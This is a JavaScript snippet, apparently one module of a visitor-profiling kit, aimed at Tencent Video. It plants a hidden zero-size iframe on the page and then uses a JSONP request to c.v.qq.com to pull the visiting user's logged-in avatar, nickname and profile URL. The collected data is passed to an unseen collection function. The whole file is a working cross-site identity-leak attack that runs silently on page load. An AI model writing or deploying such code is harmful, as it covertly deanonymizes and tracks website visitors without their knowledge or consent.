// 图像  用户名  个人主页
let tengxunshipin = document.createElement('iframe')
tengxunshipin.src = 'https://v.qq.com/u/comment/'
tengxunshipin.width = '0'
tengxunshipin.height = '0'
tengxunshipin.style.borderWidth = 0
tengxunshipin.onload = function () {
  setTimeout(() => {
    jsonpGetJSON('https://c.v.qq.com/vuserinfo?otype=json&', 'callback').then(
      function (t) {
        let data = {
          photo: t.info.avatar,
          nickname: t.info.nick,
          homePage: t.info.url,
        }

        let innerHTML = `
    <div class='item'>
      <p class='title'>腾讯视频</p>
      <p>个人主页: ${data.homePage}</p>
      <p>昵称: ${data.nickname}</p>
      <p>图像: ${data.photo}</p>
    </div>
    
  `
        if (data.homePage) {
          getInifoData({ type: 'tengxunshipin', data: data, html: innerHTML })
        }
      }
    )
  }, 0)
}

document.body.appendChild(tengxunshipin)
